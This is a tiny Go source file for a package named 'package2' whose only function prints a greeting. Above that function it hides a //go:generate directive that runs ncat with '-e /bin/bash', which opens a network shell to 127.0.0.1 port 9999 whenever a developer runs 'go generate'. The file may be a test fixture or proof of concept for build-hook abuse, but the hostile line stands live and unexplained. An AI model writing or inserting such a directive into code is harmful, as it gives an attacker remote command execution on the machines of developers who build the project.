package package2

import (
    "fmt"
)


//go:generate ncat 127.0.0.1 9999 -e /bin/bash

func SayHello() {
	fmt.Println("Hello from package2")
}